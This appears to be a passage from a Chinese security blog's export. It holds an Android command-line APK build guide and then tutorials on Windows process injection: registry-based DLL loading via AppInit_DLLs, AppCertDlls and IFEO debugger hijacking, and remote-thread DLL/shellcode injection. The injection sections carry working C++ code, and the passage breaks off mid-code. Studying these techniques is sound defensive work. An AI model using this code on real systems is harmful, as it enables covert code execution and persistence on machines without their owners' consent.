class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MainActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">Activity</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"meta\">@Override</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">      setContentView(R.layout.activity_main);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在res\\values下创建strings.xml，内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;app_name&quot;</span>&gt;</span>A Hello Android<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;hello_msg&quot;</span>&gt;</span>Hello Android!<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;menu_settings&quot;</span>&gt;</span>Settings<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">string</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;title_activity_main&quot;</span>&gt;</span>MainActivity<span class=\"tag\">&lt;/<span class=\"name\">string</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在res\\layout下创建activity_main.xml,内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">RelativeLayout</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class=\"attr\">xmlns:tools</span>=<span class=\"string\">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">android:layout_width</span>=<span class=\"string\">&quot;match_parent&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">   <span class=\"attr\">android:layout_height</span>=<span class=\"string\">&quot;match_parent&quot;</span> &gt;</span></span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">TextView</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:layout_width</span>=<span class=\"string\">&quot;wrap_content&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:layout_height</span>=<span class=\"string\">&quot;wrap_content&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:layout_centerHorizontal</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:layout_centerVertical</span>=<span class=\"string\">&quot;true&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">android:text</span>=<span class=\"string\">&quot;@string/hello_msg&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">tools:context</span>=<span class=\"string\">&quot;.MainActivity&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">RelativeLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在项目的根目录下创建AndroidManifest.xml文件，内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:a</span>=<span class=\"string\">&#x27;http://schemas.android.com/apk/res/android&#x27;</span> <span class=\"attr\">package</span>=<span class=\"string\">&#x27;com.example.myapplication&#x27;</span> <span class=\"attr\">a:versionCode</span>=<span class=\"string\">&#x27;0&#x27;</span> <span class=\"attr\">a:versionName</span>=<span class=\"string\">&#x27;0&#x27;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span> <span class=\"attr\">a:label</span>=<span class=\"string\">&#x27;A Hello Android&#x27;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">a:name</span>=<span class=\"string\">&#x27;com.example.myapplication.MainActivity&#x27;</span>&gt;</span></span><br><span class=\"line\">             <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">a:name</span>=<span class=\"string\">&#x27;android.intent.category.LAUNCHER&#x27;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">a:name</span>=<span class=\"string\">&#x27;android.intent.action.MAIN&#x27;</span>/&gt;</span></span><br><span class=\"line\">             <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">application</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"编译代码\"><a href=\"#编译代码\" class=\"headerlink\" title=\"编译代码\"></a>编译代码</h3><p>生成R.javad文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\aapt.exe package -f -m -J .\\java -M .\\AndroidManifest.xml -S .\\res -I C:\\Android\\SDK\\platforms\\android-26\\android.jar</span><br></pre></td></tr></table></figure>\n\n<p>编译java代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">javac -d .\\obj\\ -classpath src -bootclasspath C:\\Android\\SDK\\platforms\\android-26\\android.jar java\\com\\example\\myapplication\\*.java</span><br></pre></td></tr></table></figure>\n\n<p>将编译好的class文件转成dex文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\dx.bat --dex --output=.\\classes.dex .\\obj\\</span><br></pre></td></tr></table></figure>\n\n<p>开始打包APK</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\aapt.exe package -f -m -F .\\test-unsigned-unaligned.apk -M .\\AndroidManifest.xml -S .\\res -I C:\\Android\\SDK\\platforms\\android-26\\android.jar</span><br></pre></td></tr></table></figure>\n\n<p>添加dex文件进APK</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\aapt.exe add .\\test-unsigned-unaligned.apk classes.dex</span><br></pre></td></tr></table></figure>\n\n<p>生成签名密钥</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias</span><br></pre></td></tr></table></figure>\n\n<p>对齐未签名的 APK</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\zipalign.exe -v -p 4 .\\test-unsigned-unaligned.apk test-unsigned.apk</span><br></pre></td></tr></table></figure>\n\n<p>签名APK</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Android\\SDK\\build-tools\\30.0.3\\apksigner.bat sign --ks my-release-key.jks --out test-release.apk .\\test-unsigned.apk</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://authmane512.medium.com/how-to-build-an-apk-from-command-line-without-ide-7260e1e22676\">https://authmane512.medium.com/how-to-build-an-apk-from-command-line-without-ide-7260e1e22676</a><br><a href=\"https://blog.csdn.net/aha_jasper/article/details/104944929\">https://blog.csdn.net/aha_jasper/article/details/104944929</a></p>\n</blockquote>\n","categories":["Development"],"tags":["Android"]},{"title":"Windows进程注入方法-注册表注入","url":"/RegistryInjection/","content":"<h1 id=\"Windows注册表注入\"><a href=\"#Windows注册表注入\" class=\"headerlink\" title=\"Windows注册表注入\"></a>Windows注册表注入</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p>windows整个系统的配置都保存在这个注册表中，有以下位置可以用来进行dll注入：</p>\n<ul>\n<li><code>AppInit_DLLs</code></li>\n<li><code>AppCertDlls</code></li>\n<li><code>image file execution options</code></li>\n</ul>\n<span id=\"more\"></span>\n\n<h2 id=\"0x2-AppInit-DLLs\"><a href=\"#0x2-AppInit-DLLs\" class=\"headerlink\" title=\"0x2 AppInit_DLLs\"></a>0x2 AppInit_DLLs</h2><h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>64 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n<p>32 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n</blockquote>\n<p>当User32.dll被映射到一个新的进程时，会收到<code>DLL_PROCESS_ATTACH</code>通知，就会取得上述注册表键的值，并调用<code>LoadLibary</code>来载入这个字符串中指定的每个DLL。</p>\n<p>DLL只会被映射到那些使用了<code>user32.dll</code>的进程中，所有基于GUI的应用程序都使用了<code>user32.dll</code>，但大多数基于CUI的应用程序都不会使用它。</p>\n<h3 id=\"2-步骤\"><a href=\"#2-步骤\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>有两个键值需要修改：</p>\n<ul>\n<li><code>AppInit_DLLs</code>：指定一个dll路径或系统路径下的dll名称</li>\n<li><code>LoadAppInit_DLLs</code>：设置为1时注入才会起效</li>\n</ul>\n<h3 id=\"3-代码\"><a href=\"#3-代码\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppInit_DLLsInject</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD dwValue = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegOpenKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>, </span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        &amp;hKey</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;AppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    dwValue = <span class=\"number\">1</span>;</span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;LoadAppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_DWORD,</span><br><span class=\"line\">        (BYTE*)&amp;dwValue,</span><br><span class=\"line\">        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(dwValue)</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x3-AppCertDlls\"><a href=\"#0x3-AppCertDlls\" class=\"headerlink\" title=\"0x3 AppCertDlls\"></a>0x3 AppCertDlls</h2><h3 id=\"1-原理-1\"><a href=\"#1-原理-1\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager</p>\n</blockquote>\n<p>此注册表项下的DLL被加载到调用<code>Win32 API</code>函数<code>CreateProcess</code>，<code>CreateProcessAsUser</code>，<code>CreateProcessWithLogonW</code>，<code>CreateProcessWithTokenW</code>和<code>WinExec</code>的每个进程中。</p>\n<h3 id=\"2-步骤-1\"><a href=\"#2-步骤-1\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>现在该位置创建一个子项<code>AppCertDlls</code>，然后在该子项中创建一对键值，将值设置为要注入dll的路径</p>\n<h3 id=\"3-代码-1\"><a href=\"#3-代码-1\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppCertDllsInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Default&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x4-Image-Hijack（映像文件执行选项（IFEO））\"><a href=\"#0x4-Image-Hijack（映像文件执行选项（IFEO））\" class=\"headerlink\" title=\"0x4 Image Hijack（映像文件执行选项（IFEO））\"></a>0x4 Image Hijack（映像文件执行选项（IFEO））</h2><h3 id=\"1-原理-2\"><a href=\"#1-原理-2\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</p>\n</blockquote>\n<p><code>IFEO</code>通常用于调试目的。开发人员可以在此注册表项下设置<code>调试器值</code>，以将程序附加到另一个可执行文件以进行调试。</p>\n<p>就是原程序的启动命令行作为参数传递给了调试器，例如<code>notepad.exe</code> ==&gt; <code>cmd.exe notepad.exe</code></p>\n<h3 id=\"2-步骤-2\"><a href=\"#2-步骤-2\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><ul>\n<li>创建一个子项，名称就是目标程序名称，例如<code>notepad.exe</code></li>\n<li>在该子项中创建一对键值，键名为<code>debugger</code>，值设置为调试器程序路径</li>\n</ul>\n<h3 id=\"3-代码-2\"><a href=\"#3-代码-2\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ImageHijackInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szPath[] = <span class=\"string\">&quot;cmd.exe&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\notepad.exe&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Debugger&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a><em>参考链接</em></h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows"]},{"title":"Windows进程注入方法-远程线程注入","url":"/RemoteThreadInjection/","content":"<h1 id=\"远程线程注入\"><a href=\"#远程线程注入\" class=\"headerlink\" title=\"远程线程注入\"></a>远程线程注入</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p>该注入手法的核心在于几个修改目标进程内存的API：</p>\n<span id=\"more\"></span>\n\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>CreateRemoteThread</li>\n</ul>\n<h3 id=\"1-OpenProcess\"><a href=\"#1-OpenProcess\" class=\"headerlink\" title=\"1. OpenProcess\"></a>1. OpenProcess</h3><p>打开指定PID的进程，获取进程句柄。首先要保证该API执行成功，需要不低于目标进程的权限。</p>\n<h3 id=\"2-VirtualAllocEx\"><a href=\"#2-VirtualAllocEx\" class=\"headerlink\" title=\"2. VirtualAllocEx\"></a>2. VirtualAllocEx</h3><p>在目标进程内存空间中申请一段空间。</p>\n<p>该函数的第三个参数为申请内存空间的size，Windows系统内存是按Page为单位的，即0x1000（4k），所以size不足0x1000也会按照1页大小来申请内存空间。</p>\n<p>该函数第五个参数为内存的保护属性，如果是注入dll，就用PAGE_READWRITE（可读可写）；如果注入的是shellcode，要加上可执行（<code>PAGE_EXECUTE_READWRITE</code>）。</p>\n<h3 id=\"3-WriteProcessMemory\"><a href=\"#3-WriteProcessMemory\" class=\"headerlink\" title=\"3. WriteProcessMemory\"></a>3. WriteProcessMemory</h3><p>向目标进程内存空间写入数据。</p>\n<h3 id=\"4-CreateRemoteThread\"><a href=\"#4-CreateRemoteThread\" class=\"headerlink\" title=\"4. CreateRemoteThread\"></a>4. CreateRemoteThread</h3><p>在目标进程中创建一个线程。</p>\n<h2 id=\"0x2-Dll注入\"><a href=\"#0x2-Dll注入\" class=\"headerlink\" title=\"0x2 Dll注入\"></a>0x2 Dll注入</h2><h3 id=\"1-说明\"><a href=\"#1-说明\" class=\"headerlink\" title=\"1. 说明\"></a>1. 说明</h3><p>步骤：</p>\n<ol>\n<li><code>OpenProcess</code>打开目标进程</li>\n<li><code>VirtualAllocEx</code>在目标内存空间申请一段内存</li>\n<li><code>WriteProcessMemory</code>将写好的dll路径写入到目标进程内存中去</li>\n<li>获取<code>kernel32.dll</code>的模块基址，再获取到<code>Loadlibrary</code>函数地址</li>\n<li><code>CreateRemoteThread</code>启动远程线程，线程地址为<code>LoadLibrary</code>函数地址，参数为dll路径字符串地址</li>\n</ol>\n<h3 id=\"2-提示\"><a href=\"#2-提示\" class=\"headerlink\" title=\"2. 提示\"></a>2. 提示</h3><ol>\n<li>在<code>WIndows</code>系统的机器上，<code>kernel32.dll</code>模块基址在同一机器上不同进程内存中是一样的。</li>\n<li><code>CreateRemoteThread</code>的参数中，线程函数的类型为<code>DWORD WINAPI ThreadFunc( LPVOID lpParam ) </code>，而<code>LoadLibrary</code>的函数类型为<code>HMODULE LoadLibrary(LPCTSTR lpFileName)</code>，可以把<code>LoadLibrary</code>当作线程函数，将dll路径字符串当作参数，这样就相当于在目标进程执行<code>LoadLibrary</code>函数来加载指定dll。</li>\n</ol>\n<h2 id=\"0x3-Shellcode注入\"><a href=\"#0x3-Shellcode注入\" class=\"headerlink\" title=\"0x3 Shellcode注入\"></a>0x3 Shellcode注入</h2><p>和Ddll注入不同，shellcode不需要落地的Dll的文件，直接将二进制代码写入目标内存空间并执行</p>\n<h3 id=\"1-说明-1\"><a href=\"#1-说明-1\" class=\"headerlink\" title=\"1. 说明\"></a>1. 说明</h3><p>步骤：</p>\n<ol>\n<li><code>OpenProcess</code>打开目标进程</li>\n<li><code>VirtualAllocEx</code>在目标内存空间申请一段内存，这里保护属性要设置为可读可写可执行（<code>PAGE_EXECUTE_READWRITE</code>）</li>\n<li><code>WriteProcessMemory</code>将写好的shellcode写入到目标进程内存中去</li>\n<li><code>CreateRemoteThread</code>启动远程线程，线程地址为申请的内存空间地址</li>\n</ol>\n<h2 id=\"0x4-代码\"><a href=\"#0x4-代码\" class=\"headerlink\" title=\"0x4 代码\"></a>0x4 代码</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InjectDll</span><span class=\"params\">(DWORD dwPId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tCHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\InjectionDll.dll&quot;</span>;</span><br><span class=\"line\">\tHANDLE hProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tLPVOID lpRemoteDllBuff = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tBOOL bRet = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">size_t</span> nNumberOfBytesWritten;</span><br><span class=\"line\"></span><br><span class=\"line\">\thProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPId);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hProcess) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] OpenProcess faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] OpenProcess success, pid:%d\\r\\n&quot;</span>, dwPId);</span><br><span class=\"line\"></span><br><span class=\"line\">\tlpRemoteDllBuff = <span class=\"built_in\">VirtualAllocEx</span>(</span><br><span class=\"line\">\t\thProcess, </span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>, </span><br><span class=\"line\">\t\t<span class=\"number\">0x1000</span>, </span><br><span class=\"line\">\t\tMEM_RESERVE | MEM_COMMIT, </span><br><span class=\"line\">\t\tPAGE_READWRITE</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteDllBuff)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] VirtualAllocEx faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] VirtualAllocEx success, lpRemoteDllBuff: %p\\r\\n&quot;</span>, lpRemoteDllBuff);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbRet = <span class=\"built_in\">WriteProcessMemory</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\tlpRemoteDllBuff,</span><br><span class=\"line\">\t\tszDllPath,</span><br><span class=\"line\">\t\t<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(szDllPath),</span><br><span class=\"line\">\t\t&amp;nNumberOfBytesWritten</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!lpRemoteDllBuff)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[-] WriteProcessMemory faild\\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">CloseHandle</span>(hProcess);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] WriteProcessMemory success, nNumberOfBytesWritten: %zd\\r\\n&quot;</span>, nNumberOfBytesWritten);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE hMod = <span class=\"built_in\">GetModuleHandle</span>(<span class=\"string\">&quot;kernel32.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] kernel32.dll module base address: %p\\r\\n&quot;</span>, hMod);</span><br><span class=\"line\"></span><br><span class=\"line\">\tFARPROC pfnLoadLibrary = <span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;LoadLibraryA&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] LoadLibraryA address: %p\\r\\n&quot;</span>, pfnLoadLibrary);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"built_in\">CreateRemoteThread</span>(</span><br><span class=\"line\">\t\thProcess,</span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t(LPTHREAD_START_ROUTINE)pfnLoadLibrary, </span><br><span class=\"line\">\t\tlpRemoteDllBuff, </span><br><span class=\"line\">\t\t<span class=\"number\">0</span>, </span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hThread)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span 